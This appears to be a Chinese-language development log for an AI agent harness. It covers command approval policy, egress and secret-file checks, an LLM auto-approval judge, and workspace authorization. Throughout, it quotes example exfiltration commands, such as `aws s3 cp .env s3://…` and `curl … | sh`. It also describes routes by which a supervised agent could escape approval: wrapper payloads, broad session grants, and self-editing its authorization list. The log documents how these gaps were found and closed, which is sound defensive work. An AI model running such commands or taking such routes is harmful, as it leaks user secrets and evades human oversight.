  `is_secret_path` 对 `.env.example` / `.env.sample` 等公开模板显式放行。
  `CheckpointManager` 改为调用同一个函数，名单只剩一处。
- 顺带修 `_opaque_payload` 的标志位解析：`--data=@file` 这类 `=` 形式先取名字再比对。

## 踩过的坑

- 出口判定一开始排在 opaque 前面，`curl … | sh` 的 code 从 `opaque_command` 变成
  `network_egress`，既有用例立即失败：标签顺序也是语义。
- `-X`（方法）与 `-x`（curl 代理）大小写折叠后同名。选择从严：代理写法多问一次，
  好过 DELETE 拿到 GET 的免审键。
- 裸主机名的「目标」只能靠猜。猜一个 `nc:host` 的键等于把免审范围放大到任意主机，
  所以宁可每次问。
- IPv6 目标解析一开始把 `[::1]:21` 切成 `::1]:21`，先处理括号再切端口。
- 改完逐段归类后，长命令摘要的旧断言失败了：摘要中间的「… 中间省略 …」独占一行，
  被当成第三个命令段。这不是 bug，而是「没看全的命令不预授权」的自然结果；
  把断言和文档都改成这条不变式。

## 测试

`test_exec_policy.py` 新增出口矩阵（GET/HEAD/上传/改方法/多主机/IPv6/userinfo/
管道/full-access/never）、复合命令同类一致性与秘密模板；`test_approval_scope.py`
验证会话批准的主机粒度与复合命令不记第一段；`test_checkpoints.py` 验证快照层与
策略层共用名单。全量 656 passed。

## 收获

- **出口是读放开后的另一半边界**：文件路径只回答「能不能拿」，出口回答「拿出去算不算」。
  只做前者，等于给外传留了一条不需要绕过的正门。
- **免审键必须窄于被批准的那一次动作**：按钮写「允许同类」，同类就要能从命令本身唯一
  推出；推出两个答案时，正确做法是不给键。
- **名单与例外只能有一份**：两处各自解释，迟早一处放行一处拒绝；统一到一个函数，
  顺带让测试能直接覆盖生产名单。
- **截断也是「没看全」**：审批面省略了内容，就不该再提供整类预授权；安全上的保守
  与展示上的省略应当互相一致。

---

## 问题：审查官的批量路径与单条路径不是同一套判定

两条路径各写一份 prompt，差异不在文风而在防御：单条有 `JUDGE_DETAIL_BUDGET` 超预算升级、
`_judge_facts` 事实段、控制字符转义和 `HARNESS_JUDGE_MODEL`；批量只把裸命令拼成
`[0] cmd`。同一条命令单审有事实、批判没事实；带 ANSI 的命令还能借批量改写提示词。
熔断也只接了一半：`judge_broken` 只在 `preflight_judge` 里被判，`enforce` 的单条闸门
不查，停用之后交互式每条 ASK 仍会白等一次 30s 超时。

同轮核出的名单洞（实测 workspace-write / on-request）：`aws s3 cp .env s3://b/k`、
`rclone copy .env remote:b`、`gcloud … delete`、`pip install`、`npx`、`Start-Process`
全部 ALLOW；`nohup`/`xargs` 虽然 ASK，但同类键记在包装器上，批一次等于开放整类。

## 做法

- `_judge_payload()` 成为唯一的 payload 构造器：触发原因、事实段、转义后的 detail 只写
  一处，批量按条复用；超预算的候选跳过，留给单条路径升级人工，不在半条命令上盲批。
- `_judge_model()` 统一 `HARNESS_JUDGE_MODEL` 回退；批量统计部分放行也记一次 `escalated`。
- 熔断判断移进 `_judge_auto_approve` 的缓存未命中分支：缓存命中仍放行，新判定直接转人工。
- `EXTERNAL_OPERATIONS` 收云 CLI 与包管理器，`_NO_SESSION_GRANT` 由它和启动器名单合并；
  前缀包装器逐段逐层剥开再判定，同类键落在内层命令上（`nohup rm -rf build` → `rm`）；
  `_strip_wrappers_in_segments` 同时服务策略判定、`bash -c` 的载荷递归和同类键，
  三处共用一份规则。
- `secret_references()` 按文件名扫 bash 的 token；命中且命令里有出口/外部操作时升级为
  `secret_egress`。不做路径解析、不硬拒：`grep .env docs` 这类正常文本用法误伤面比
  文件工具大，要不要拦由人看完整条命令决定。
- 飞书侧补审查官放行通知：`recent_permissions()` 读 `/v1/permissions` 的 `recent`，按
  会话归属推一条不带按钮的提示；只推网关启动之后产生的请求（重启不补历史），去重集合
  与 pending 的通知集合分开——后者每轮按 pending 收敛，混用会重复通知。

## 测试

`test_exec_policy.py` 新增云 CLI/包管理器/启动器矩阵、包装器判定与同类键、秘密外发；
`test_approval_judge.py` 新增批量 payload 与单条同源、超预算候选不进批量，并把熔断用例
补到「单条路径也不得再调 LLM」。

## 收获

- **两条路径的防御必须同源**：复制一份 prompt 就是复制一份遗漏，差异迟早出现在最危险
  的那条路上。
- **熔断是状态，不是参数**：只在批量入口查一次，等于给单条路径留了每次 30s 的后门。
- **同类键要落在真正执行的动作上**：包装器不是动作，按它记账买的是整类命令。
- **秘密检查要看数据流向**：本地读放开是既定策略，外发才是要人看一眼的那一步。
- **「少问」要配「知道被少问了什么」**：自动放行不占审批面，就必须在同一个界面留痕，
  否则用户只会看到工具悄悄执行了。
- **剥包装器必须按段**：只剥整条命令的开头时，`true; nohup aws s3 cp .env …` 是 ALLOW，
  而同类键却按段算——判定比免审键更松，边界就落在松的那一侧。判定、`bash -c` 载荷递归
  和同类键必须共用同一份剥离规则。

---

## 问题：bash 的越界写在 workspace-write 档一次都不问

文件工具早就按路径分区：工作区内写免审，工作区外、系统目录要审批，秘密文件硬拒。
bash 却没有这一步——`cp a.txt C:/Users/someone/x.txt`、`echo hi > C:/Windows/x.txt`
在 workspace-write 档全部 ALLOW。默认档的名字叫「工作区写」，实际上只约束了文件工具，
约束不到命令；而模型完全可以用 `cp`/`tee`/`dd` 绕过一次文件工具审批。

补第一版时又核出两个同类缺口：shell 包装器载荷（`bash -c 'cp a C:/x'`、
`cmd /c "copy a C:\x"`）外层动词不是写命令，扫描看不见里面的写目标；以及会话白名单
排在审批之前——批准一次工作区内的 `cp a b` 并勾选「本会话允许同类」后，`cp .env
C:/…` 会凭同一个 `bash:cp` 键直接放行，新加的越界写检查被原地旁路。

## 做法

- `FILE_WRITE_COMMANDS`（`cp`/`mv`/`tee`/`dd`/`tar`/`unzip`/`mkdir`/`install`/PowerShell
  的 `*-Item` 等）与重定向目标共同构成写目标；`_write_targets()` 同时认 `> x`、`2> x`、
  `of=C:/x`、`--output=C:/x` 几种写法。
- `_looks_pathish()` 只认显式指向某处的路径：盘符、UNC、`~`、含 `..` 的段，或带两段的
  POSIX 绝对路径。单段 `/x` 不认——`cmd /c`、`xcopy /s` 的开关就长这样，误认会让包装器
  命令白白丢掉同类键。相对路径按 cwd 解析后本来就在工作区内，不单独升级。
- `_outside_write_targets()` 用 `classify_path()` 判分区，与文件工具同一套工作区/秘密/
  系统目录规则；`_all_write_targets()` 下钻 `bash -c`/`cmd /c` 载荷（有段数预算），
  前缀包装器仍由 `_strip_wrappers_in_segments()` 逐段剥。
- `Policy.evaluate()` 在 workspace-write 档多一步 §7：命中越界写目标 → ASK
  `outside_workspace_write`；读命令（`cat`/`find`/`ls`…）不在写名单里，读照旧放开。
  工作区由 `hooks.evaluate_call()` 传入 `get_workdir()`；漏传时退回进程 cwd，是退化不是放行。
- 同类键收紧：带写目标的段返回 `None`（`_bash_segment_class`），「本会话允许同类」按钮
  不出现、也不写键。第一版写成「任何显式路径都没有同类键」，结果把 `rm -rf /tmp/a`
  （测试明确要求键是 `rm`）和绝对路径调用 `C:\Windows\System32\cmd.exe /c del x`
  （键应为 `del`）一起误伤——路径出现在参数/动词位置，和「写目标」不是一回事。

## 踩过的坑

- **开关与 POSIX 绝对路径同形**：`/c`、`/s` 看起来就是绝对路径；判定必须要求
  `/a/b` 这种两段形式，否则 `cmd /c`、`xcopy /s` 全部丢掉同类键。
- **判定必须和免审键同源**：越界写扫描只扫外层段时，`bash -c 'cp a C:/x'` 是 ALLOW；
  而同类键又会把整个 `cp` 类放进白名单。两处都必须看穿包装器载荷。
- **新 ASK 类别要先问「白名单能不能绕过它」**：`enforce` 的会话白名单在审批之前，
  任何新加的询问条件如果不收紧同类键，都只是给「批一次同类」多送一个可绕过的分支。
- **文本分析的边界要写进文档**：引号不做语法解析，含空格的路径只取到前半截；藏在解释器
  字符串、变量展开、命令替换里的路径看不到。真边界仍是 OS 沙箱，这一层只负责「命令里
  明写的目标」。

## 测试

`test_exec_policy.py` 新增越界写矩阵（`cp`/`mv`/`tee`/`dd`/`unzip`/`install`/重定向/
`nohup`/`bash -c`/`cmd /c`）、读与工作区内写放行矩阵、三档行为，以及「带写目标的段
没有同类键」；`test_execution_paths.py` 钉住 hooks 传给策略层的是 harness 工作区；
`test_approval_scope.py` 验证一次工作区内 `cp` 的会话批准不覆盖越界写。

## 收获

- **档位的名字要对得上实际约束**：叫 workspace-write 就不能只约束一半工具。
- **新增询问点的同时检查预授权**：否则询问是新的，绕过的老路还通着。
- **启发式规则要窄**：只抑制真正危险的键（写目标），别把「出现过路径」当成「可能越界」；
  前者误伤面小，后者会把正常的绝对路径调用也变成每次都问。

---

# 第 23 部分：工作区登记与多根授权（新增）

## 问题：会话能选目录，但清单无处沉淀，且「登记」很容易变成「授权」

会话在创建时已经能选工作区，但每次都要从会话反推目录：没有名字、重启后无法确认
「我登记过哪些目录」，非交互脚本也没有指定目录的入口。另一方面，服务端只有
`HARNESS_WORKSPACE` 一个根，用户想同时用两个项目目录时只能切换主根、重启服务。

加登记表最直接的做法是「登记项 = 允许的目录」，但登记表默认放在 `.cache` 下，
而 `.cache` 对 Agent 可写：Agent 只要往 `workspaces.json` 写一行，就能在下次
`configure_workspace_root` 时给自己授权任意路径。这样安全边界就落在被约束的一方手里。

## 做法

- `src/workspaces.py` 只负责发现：命名、最近使用排序、规范化去重、损坏 JSON 容错、
  临时文件 + `Path.replace()` 原子写。文件里保存 `id/name/path/added_at/last_used_at`。
- 授权仍由启动配置决定：`HARNESS_WORKSPACE`（主根）+ `HARNESS_WORKSPACE_ROOTS`
  （额外根，`os.pathsep` 分隔）。`workspace_roots()` 统一解析，`resolve_workspace()`
  接受 `allowed_roots`，`AgentRuntime` 和 `TaskManager` 共用同一组根。
- `workspace_choices()` 合并当前目录、登记项和最近会话目录，按规范化路径去重，
  返回 `id/saved/exists/allowed`；未授权项可以展示，但创建前一律拒绝。
- CLI：`/workspaces`、`/workspace add/remove`、`/new --ws`；相对 `add` 基于 `WORKDIR`。
- 飞书：`/new` 发工作区卡片，文本列表兜底；`/new <n>`、`/new ws:`、`/new id:`、
  `/new <路径>` 共用最近一次快照；快照 10 分钟过期，切目录/恢复/分叉/解绑后失效。
- API/SDK：`GET/POST/DELETE /v1/workspaces` 与 `client.workspaces.*`，远程登记只接受
  已授权根内的路径。

## 踩过的坑

- **可写目录里的清单不能当授权**：这是本部分的核心取舍。登记项只能影响「显示什么、
  排多前」，不能进入 `allowed_roots`；否则编辑 `.cache/workspaces.json` 就等于提权。
- **候选行不带登记 id**：飞书按名称移除时拿不到 `id`，`DELETE /v1/workspaces/{id}`
  只能拿到 `KeyError('id')`。合并列表必须把登记 id 一起带出来。
- **快照过期后的数字不能回落成会话 ID**：`/new 1` 在列表失效后曾按旧逻辑进入
  「会话 ID = 1」分支，用户以为选目录、实际建了一个奇怪命名的会话。过期就明确拒绝。
- **相对路径的基准要分开**：CLI 相对 `WORKDIR`，飞书/API 相对当前会话工作区；
  统一按进程 cwd 会让「在项目里 `/workspace add src`」登记到服务端启动目录。
- **测试也要隔离登记表**：默认路径是 `SESSIONS_DIR.parent/workspaces.json`，
  测试里 `SESSIONS_DIR` 常指向 `tmp_path` 本身，默认路径就落到共享测试父目录；
  conftest 用 `HARNESS_WORKSPACE_FILE` 把它钉进每个用例自己的 `tmp_path`。
- **嵌套多根会把沙箱放宽**：任务沙箱根原先取第一个包含 cwd 的授权根，
  `[C:\, C:\proj]` 就让 `C:\proj` 里的任务拿到整盘写权限。改为取路径最具体
  的那条根，多根合并只能收紧、不能放宽。

## 测试

`test_workspaces.py` 覆盖登记往返、同名刷新、损坏文件、重复路径折叠、缺失目录拒绝、
名称歧义与 `find_workspace` 选择器；`test_agent_runtime.py` 钉住「登记不授权」与
多根创建；`test_task_manager.py` 验证多根 cwd 与嵌套根取最具体沙箱根；`test_cli_commands.py` 覆盖
`/workspace(s)` 与 `/new --ws`；`test_feishu_gateway.py` 覆盖首聊列表、卡片按钮、
TTL 过期、未授权目录与失效时机；`test_session_workspace.py` 覆盖 API 多根与登记端点。

## 收获

- **发现与授权必须分家**：清单可以放在 Agent 写得到的地方，权限不行。
- **列表的序号是一种短期契约**：过期、切目录、建会话后都要作废，不能拿旧序号
  去猜新状态。
- **同一份合并规则要给所有入口用**：CLI、飞书、API 各自拼候选，迟早会出现
  「一边能选、一边说未授权」；统一到 `workspace_choices()` 之后，状态字段才有意义。



1. **每个 tool_call 都必须有 tool 结果**——阻断 ≠ 跳过，阻断也要返回一条 tool 消息。
2. **安全是分层防御**——黑名单 + 询问 + 拒绝记忆 + 提示词，单靠一层永远不够。
3. **压缩分四级成本**——0 API → 1 API → 出错才触发，阈值顺序决定是否死代码。
4. **校验器必须双向**——dangling 和 orphan 都是硬错误，缺一边测试就是漏网之鱼。
5. **模型是系统边界**——参数兜底、命令靠提示词约束、输出靠解析兜底。
6. **真机跑一遍顶十轮测试**——mock 全绿 ≠ 线上不崩，端到端验证产物用后即清。
7. **推理模型是"会思考"的边界**——max_tokens 要给思考链留预算，content 可能为空必须兜底。
8. **Windows 编码是隐形杀手**——读写显式 UTF-8，提示词规避 Get-Content，图标字符慎用。
9. **异步能力靠锁与保活兜底**——daemon 线程进程退出即消亡，"到点执行"必须进程保活；并发互斥用非阻塞抢锁 + 双重检查 + finally 释放（推/拉没有绝对优劣，按场景分工）。
10. **模块拆分后全局搜被移走的引用**——run_bash 移到 tools.py 后，agent_teams 还在调 `harness.run_bash` → AttributeError 静默废掉 teammate 的 bash。搬代码 ≠ 改完，直接引用要全查。
11. **"公平分工"是协调问题不是并发问题**——轮询认领无协调必然偏斜（相位领先者通吃）；多 agent 协作要显式分配或加抖动。
12. **改返回值语义必须同步所有调用点**——返回码从布尔改字符串后，调用方真值判断把 'awake' 当成 shutdown，teammate 收到计划批准反而退出。
13. **隔离优于约束**——与其提示模型"别写错目录"，不如用 git worktree 在物理上隔离；会话级可变状态（当前 cwd）必须显式跟踪完整生命周期，否则泄漏到下一个任务。
14. **判定只能有一处**——同一套黑名单写三遍，实际边界就是最弱的那条路径；策略层收敛后，档位、审批分级、凭据都只需要解释一次，四条执行入口的行为才可验证。
15. **"不问"不等于"允许"**——没有 OS 沙箱兜底时，`never` 必须 fail-closed；把"不打断"实现成"静默放行"，等于关掉最后一道闸。
16. **审批只接受意图，不接受结论**——同类判定键、白名单范围这类"结论"要由服务端从被审批的内容推出；让客户端传 `klass` 等于让审批人自己划免审边界。同理，运行时扩充进来的第三方工具默认询问：不认识 ≠ 没有副作用。
17. **审批要看得见、且按会话算数**——命令摘要留头尾（截掉的往往就是危险的后半句）、控制字符转义（别让被审批的字符串改写审批界面）、会话 id 与凭据一样显式跨线程带走（ContextVar 不随线程继承，漏带就退回进程级白名单）、`untrusted` 档不走白名单短路，同类键解开 `cmd /c` 这类包装器。
18. **免审粒度不宽于按钮的含义**——按程序名记「同类」，批一次 `ssh host rm x` 就开放了整会话的任意远程命令；解释器/远程执行/容器/Git 写子命令要么按子命令收，要么干脆不给免审出路。同理，安全档位不能存在被约束者可写的位置（工作区内的 `.env`），状态变更要配撤销口（`/revoke`、换档作废旧预授权）。
19. **读放开要把边界移到写和出口**——读任意文件本身不新增能力（bash 早就能读），真正的风险是「读得到 + 发得出去」。所以文件工具的硬拒改成「读放行、越界写审批、秘密文件拒绝」，同时明确下一步必须把外发审批接上；同一路径必须由同一个解析函数判定，否则策略批的和工具写的可能不是同一个地方。
20. **只读工具也是读**——grep / ls / glob 必须继承 read 的路径分区与秘密过滤；grep 在打开文件之前跳过秘密目标，否则 read 的硬拒只是一扇没关的侧门。
21. **审批归属必须先于审批决议**——消息入口要校验来源（只收单聊）、进程入口要校验身份（白名单缺失即拒启）、请求要按登记会话路由到唯一聊天；拿到 req_id 不等于有权决议，按钮和文本命令都必须回到「这条请求是否推给当前聊天」。
22. **免审键要窄于被批准的动作**——外发请求只给 curl/wget 的普通读请求记 `命令:主机`，改方法/带请求体/多目标/裸主机名都不记；复合命令每段同类一致才记，否则批准 `ls && rm x` 会留下一个 `bash:ls` 的万能键。GET 也要审批：读放开后，出口边界问的是「东西能不能出去」，不是「这个请求危不危险」；摘要截断的命令同样不预授权。
23. **可写位置只能放发现数据，不能放授权**——登记表、缓存、快捷列表可以住在 Agent 写得动的地方，但只能决定「展示什么/排序」；授权根必须来自进程启动配置，否则被约束者改一行 JSON 就能给自己扩权。

## 基础工具补齐（P0–P2）

对照 Codex 和其他 Agent 的基础工具面，按优先级补了以下能力：

- **P0**：`read` 增加 `offset`/`limit`，大文件默认只取 200 行并提示下一次偏移；文件工具统一按
  BOM → UTF-8 → GB18030 解码，拒绝二进制内容，写回保留原编码与换行符。`edit` 对多处匹配默认
  报错，`replace_all` 显式全改。`bash` 增加 `cwd`、`timeout`、`run_in_background`，前台默认
  120 秒、后台 3600 秒；新增 `background_output`（可等待）与 `kill_background`，结果收集后仍
  保留历史供取回。
- **P1**：新增 `apply_patch`，支持 Codex 风格 Add/Update/Delete/Move。先解析并规划全部目标，
  再统一写盘；任一步失败按逆序回滚。多文件路径按最严格分区聚合审批，格式错误在策略层硬拒。
  新增 `web_fetch`：仅 http/https、解析后所有地址必须是公网、重定向逐次复检、2 MiB/20 秒上限、
  HTML 转文本；合法 URL 走 `network_egress` 审批，同类键按主机记。子代理改为每次启动时读取
  实时工具注册表，并过滤控制类工具与 bash 后台开关。
- **P2**：`grep` 增加 ripgrep 快路径。rg 只用于 ASCII 模式；非 ASCII、rg 缺失、输出出现替换符
  或返回码异常时回落到内置遍历。两条路径共用秘密文件、忽略目录、glob 语义与结果上限的后置
  过滤，避免「快路径悄悄放宽边界」。

- **P3**：补齐多模态与工作区视图。`view_image` 按 magic 识别 PNG/JPEG/GIF/WebP/BMP，原图落到
  工具缓存，历史里只留 `{"type": "harness_image", "path": ...}` 轻量引用；每次请求前
  `expand_image_parts` 把引用读成 data URI，并作为**独立的 user 消息**排在整批 tool 结果之后
  （部分 OpenAI 兼容接口不接受 tool 角色里的图片）。`todo_write` 改为按会话分区、校验状态与
  唯一 `in_progress`、整表替换并写入 `todos` 事件；新增 `todo_read` 与 `restore_todos`，会话
  重启后计划仍在。`/diff` 从文件状态升级为逐行统一 diff（含未跟踪文件与重命名来源），回合结束
  时打印本轮改动清单并写入 `files_changed` 事件；Git 基线能捕捉 bash 造成的改动，非 Git
  工作区回退到 checkpoint 的 pre/post hash。

- **P4**：新增 `read_document`。PDF 走 `pypdf` 文本层（可选依赖），DOCX/PPTX/XLSX 用
  `zipfile` + `ElementTree` 直接解析 OOXML，不引入 python-docx/pptx/openpyxl。`pages` /
  `sheets` 支持 1-based 范围（`1-5,8`、`10-`、`all`），默认前 20 页 / 8 个工作表；输出保留
  标题、列表、Markdown 表格和 PPT 演讲者备注；文档 64 MiB、单个 zip 成员 16 MiB、输出
  20k 字符封顶。`read` 遇到文档后缀会提示改用 `read_document`，不再按文本读成乱码。扫描版
  PDF 没有文本层时明确提示先转图片走 `view_image`，不做 OCR。

  图片 token 估算从固定 1000 升级为按实际宽高和模型族计算：OpenAI 先缩进 2048²、短边 768，
  再按 512 瓦片（85 + 170/片）；Claude 长边缩到 1568、按面积/750、上限 1600；Gemini 按
  768 瓦片、每片 258；DeepSeek 官方只公布缩放后每图上限 1024、无公开公式，按 1024 保守计。
  无法识别尺寸或旧消息引用使用固定兜底值，`HARNESS_IMAGE_TOKEN_ESTIMATE` 可调。估算只服务
  上下文保护，不代表账单 token。

  新增 `render_document`：PDF 用 pypdfium2 直接渲染页面；DOCX/PPTX 先由 LibreOffice
  headless 转 PDF 再渲染，缺少 `soffice` 时明确报错而不是启动 Office 桌面程序。默认前 3 页、
  单次最多 8 页、72–200 dpi，渲染结果复用 `harness_image` 引用与 user 附件通道。XLSX 不做
  打印分页渲染，指向 `read_document`。

**有意不做**：MCP 桥当前只暴露 tools，没有 resources 通道；NotebookEdit 对 Codex 对齐
不是必需项，`.ipynb` 可以按 JSON 用 read/edit 处理。这两项等对应基础设施就绪后再补。

验证：`tests/test_bash_controls.py`、`test_apply_patch.py`、`test_web_fetch.py`、
`test_subagent_surface.py`、`test_grep_backend.py`、`test_view_image.py`、
`test_todo_tools.py`、`test_workspace_diff.py`、`test_documents.py` 分别钉住上述边界；
全量 `pytest` 940 passed，`ruff check harness.py src tests` 通过。

- **多模态历史只存引用，不存 base64**：把 data URI 写进消息会让每次上下文压缩、转录落盘和
  事件回放都搬运几百 KB；引用 + 请求前展开把成本压到一次读缓存文件，缓存丢了还能降级成
  一条文本占位，而不是让整个请求 400。
- **图片附件不能塞进 tool 消息**：Chat Completions 对 tool/system 角色里的 `image_url` 支持
  不一致，兼容路径是「tool 结果放文字摘要 → 整批 tool 结果结束后补一条 user 多模态消息」；
  还要求所有 tool 结果连续，否则并行 tool_calls 的配对会被判成孤儿。
- **回合改动清单必须能看见 bash 的副作用**：只比较 `write`/`edit` 的 checkpoint 记录会漏掉
  脚本、格式化器和 `git checkout` 改的文件；以回合开始时的 git status + 内容签名做基线，
  再把 checkpoint 的净 hash 变化作为非 Git 工作区的回退，两条路径都排除 `.cache` 等内部目录。
- **todo 的持久源是事件流，不是内存字典**：进程重启后 `_TODOS` 是空的，`todo_read` 必须能
  从最后一个 `todos` 事件恢复；按会话分区则避免 A 会话的计划泄漏给 B 会话。
- **多文件修改要两阶段**：先全部解析、校验、算出最终内容，再统一落盘；边解析边写的话，后一个
  文件报错时前面的改动已经生效，回滚逻辑也会因为没有完整的 pre-image 而不可靠。
- **新联网工具必须复用出口审批**：`web_fetch` 如果自己写一套 URL 校验就绕过了「本机要不要把
  请求发出去」的人工决议；地址合法性（防 SSRF）和出口许可（防数据外传）是两道独立的闸。
- **工具面必须是请求时的快照，不是 import 时的快照**：子代理在进程启动后动态注册/禁用工具时
  仍要看到真实可用集合，否则要么拿到已删除的工具，要么漏掉新工具。
- **固定图片 token 只能当兜底**：同样是 1024²，GPT-4o 高细节约 765、Claude 约 1399、
  Gemini 约 1032；固定 1000 会低估 Claude，又高估小图。引用落盘时顺手算好 `tokens`，
  压缩阈值才不会随图片尺寸和模型切换而失真；但也不能把它当计费值，provider 规则会变。
- **文档输入优先本地抽取，不押注 provider 原生文件块**：Chat Completions 只有 PDF 有
  file content part，DOCX/PPTX/XLSX 的支持随 provider 而异；本地抽成文本可保证换模型可用，
  代价是丢版式、图片、公式和合并单元格细节，需要在工具描述里说清楚。
- **OOXML 是不可信输入**：zip 本身可能带超大成员或大量条目，解析前先限制成员大小，
  表格行列和最终输出也要裁剪；否则一份文档就能把内存或上下文打满。
- **扫描 PDF 不是解析器能解决的问题**：没有文本层时返回明确提示并指向 `view_image`，
  不要用空文本冒充内容；OCR 需要额外的渲染与识别链路，不应悄悄塞进读文件工具。
- **排版和文字是两条通道**：`read_document` 给模型可检索的文字，`render_document` 给模型
  版式、图表和扫描页；不要指望文本抽取保留列宽、合并单元格或艺术字。渲染图仍然走同一套
  `harness_image` 缓存和 user 附件，历史里不会出现 base64。
- **Office 渲染不要偷偷拉起见不得人的桌面进程**：Word/PowerPoint COM 自动化会启动完整
  桌面程序、执行宏、留下孤儿进程；改用 LibreOffice headless，并把 `soffice` 缺失当成
  可解释的能力缺口，而不是静默失败。宏文档在转换前直接拒绝。
- **provider 的图片规则要按官方口径取保守值**：DeepSeek 只公布每图上限 1024、没有瓦片
  公式，就按 1024 计；固定 1000 既不是它的账单值，也不该被当成精确值。图片只放 user
  消息这一点与现有附件布局一致，不需要为 DeepSeek 单开一条消息通道。
## 无头执行、项目说明与只读审阅

**问题**：Harness 只有交互式入口，脚本、CI 和编辑器插件没法复用同一条回合循环；模型也不知道
仓库自己的约定（测试命令、代码风格），每次都要用户重复贴一遍；提交前的检查仍靠人眼，而「把 diff
交给模型看」很容易顺手把写权限一起给了它。

**做法**：

- `entrypoint.py` 增加 `-p/--print`、`--json`、`--session`、`--workspace`、`-i/--image`，
  `src/headless.py` 复用 `AgentRuntime.send()` 而不另写一套回合循环。stdout 只留最终回答（或
  JSONL），其余诊断统一重定向到 stderr。`exec_tool_call` 增加 `on_event` 出口，工具事件与结果
  从同一条截断后的内容派生，所以 JSONL 里的 `output` 就是历史里的形态。无头进程不启动 cron/
  队列线程、不做标题生成与记忆提炼（`housekeeping=False`），否则 daemon 线程会被进程退出直接截断。
- `src/project_context.py` 读取工作区根目录的 `AGENTS.override.md` / `AGENTS.md` / `CLAUDE.md`，
  32 KiB 截断，缓存键是 `(解析后路径, mtime_ns, size)`，作为 system prompt 的 `project` 段
  注入主循环与子代理；`HARNESS_PROJECT_CONTEXT=off` 可关闭整条通道。
- `skill_system` 改为内建 `APP_DIR/skills` + 工作区 `SKILLS_DIR` 合并扫描，工作区同名技能覆盖
  内建；manifest 的 mtime/size 作为签名，`list_skills()` / `load_skill()` 前自动重扫，CLI 切换
  工作区也会重扫，编辑 skill.md 不用重启。
- `src/review.py` 的 `/review` 用只读子代理审阅未提交 diff：工具面收窄到 `read/glob/grep/ls`，
  `exec_policy.classify_path` 在调用工具前拒绝工作区外路径，敏感文件在进入 prompt 前就被剔除；
  轮次、diff 长度和上下文长度都有上限。

**踩过的坑**：

- stdout 一混进工具日志，`--json` 就不再是 JSONL。`contextlib.redirect_stdout` 必须在 `_run`
  之前生效，而最终回答要写回调用方捕获的原始流。
- 无头进程里跑 housekeeping 不是「多做一点」：标题和记忆提炼会再发两次 LLM 请求，进程退出时
  它们还在排队，事件流里留下半截状态。要么等 `wait_for_housekeeping()`，要么显式关掉；一次性
  执行选后者。
- 图片附件不能只在 `--image` 上传路径：历史里必须存缓存引用，下一轮请求前再由
  `expand_image_parts` 展开成 data URI。越界图片没有交互审批可等，只能在发送前快速失败。
- 项目说明是仓库可控内容：跟着符号链接读到工作区外、把它当可信指令源、或让它覆盖审批规则，
  都会把「仓库里的一个文件」变成提权面。路径边界与优先级必须写进实现，而不只是写进文档。
- `/review` 不能复用主工具面：有 `bash` 就能改工作区，「只读审阅」就成了口头承诺。它也不能留下
  同类预授权——审查过程中的一次工具批准，不该变成后续会话里的免审通行证。

**测试**：`test_headless.py` 钉住 stdout 纯净、JSONL 事件、退出码、图片边界、恢复会话、
housekeeping 关闭与「参数解析失败也要配对上报 started/completed」；`test_project_context.py` 覆盖
优先级、截断、符号链接逃逸、缓存失效、技能合并与重扫；`test_review.py` 覆盖干净/非 Git 工作区、
工具面收窄、越界路径拒绝、敏感文件过滤与轮次预算；`test_entrypoint.py` 覆盖无头标志解析、
派发与 `--resume` 误用。全量 `pytest` 976 passed / 1 skipped，
`ruff check harness.py src tests` 通过。

**收获**：

- 传输层只决定「谁看得到什么」，回合逻辑仍然只有 `agent_loop` 一份；加一个入口不等于复制一套循环。
- 一次性进程必须显式声明生命周期：后台线程、housekeeping、MCP 连接都要有明确的收尾点。
- 把 diff 交给模型时，权限要按「这次审阅」收窄，而不是按「这个工具平时能做什么」。
- 仓库内的说明文件是输入，不是配置：它只影响提示，不影响授权；这条边界要在代码里写死。

## 依赖分层与主循环减重

**问题**：文档能力把 pypdf / pypdfium2 / Pillow 放进了基础安装，只想要 Agent 本体的用户也得为
PDF 渲染买单；DOCX/PPTX 渲染还牵连 LibreOffice，容易被误读成「装个 Agent 要先装办公套件」。
同时 harness.py 继续变长（本批改动后 2248 行），标题生成、prompt 组装这类可复用原语混在循环
编排里，既难定位，也让文件长度持续上涨。

用户使用 Codex 时是否需要自行安装转换程序，取决于运行环境是否已预装相关工具，以及是否
需要查看 Office 页面的排版；不能据此断言 Codex 无法渲染文档。本项目将能力按需求分层：
Office 文本抽取走标准库，PDF 文本抽取与页面渲染需要可选包，Office 页面渲染另需 LibreOffice。

**做法**：

- 新增 `requirements-docs.txt`（`pypdf` / `pypdfium2` / `Pillow`），从基础 `requirements.txt` 移出；
  `requirements-dev.txt` 注明全量回归需要它。
- 工具的安装提示统一指向 `requirements-docs.txt`；`pypdfium2` 的 `to_pil()` 单独捕获 Pillow 缺失，
  避免 `No module named 'PIL'` 被通用渲染错误吞掉。
- `test_documents` / `test_document_render` 在缺少可选依赖时整组跳过（`importlib.util.find_spec`），
  而不是测试收集失败。
- 从 `harness.py` 抽出 `src/prompt_assembly.py`：`PROMPT_SECTIONS`、`assemble_system_prompt`、
  `get_system_prompt`、`update_context`、`build_system` / `build_sub_system`、
  `project_prompt_section`。通过 `_h()` 回读 harness，monkeypatch 入口不变；提示词文案逐字保留，
  避免无谓的前缀变化。
- 抽出 `src/session_title.py`：取材、LLM 调用与本地兜底；只保留一条 `_is_session_title_candidate`，
  删除从未被调用的 `_has_session_title_source`。
- 规范新文件：模块 docstring 后空行、顶层定义之间两空行、解释「为什么」的块注释统一中文。

**踩过的坑**：

- 「可选依赖」要按能力分层，不是按包名：DOCX 文字不需要 LibreOffice，PPTX 备注也不需要，只有
  渲染才需要。文档里必须按「要读到什么」而不是按扩展名描述安装成本，否则用户会把可选当成必需。
- `pypdfium2.to_pil()` 是 Pillow 的真正入口：包能 import、页面能 render，最后一步才炸；不单独
  捕获就只能得到一条通用渲染错误。
- 移动函数后，测试的 monkeypatch 打在 harness 的名字上：被调方必须经 `_h()` 或模块属性查一次，
  直接 `from x import y` 会把补丁绕过。
- prompt 文案是缓存前缀的一部分：搬代码可以，改标点、空格、顺序不行。
- 拆完以后 `ContextVar` 只能留一份定义（F811）；`_prompt_cache` 跟随模块走，harness 只
  re-export 同一个对象。

**测试**：`pytest` 976 passed / 1 skipped（缺可选依赖时两组文档用例整组 skip，其余照常）；
`ruff check harness.py src tests` 通过；`harness.py` 2248 → 2028 行。

**收获**：

- 依赖分层按「能力」而不是「文件类型」：基础安装 = 主循环 + 工具骨架；文档、API、飞书各自可选。
- 减少文件长度最安全的方向是「可复用原语」下沉到 `src/`，而不是把循环拆碎——循环顺序本身就是
  不变式。
- 可选依赖的可用性要在三处保持一致：安装说明、运行时错误提示、测试跳过策略。
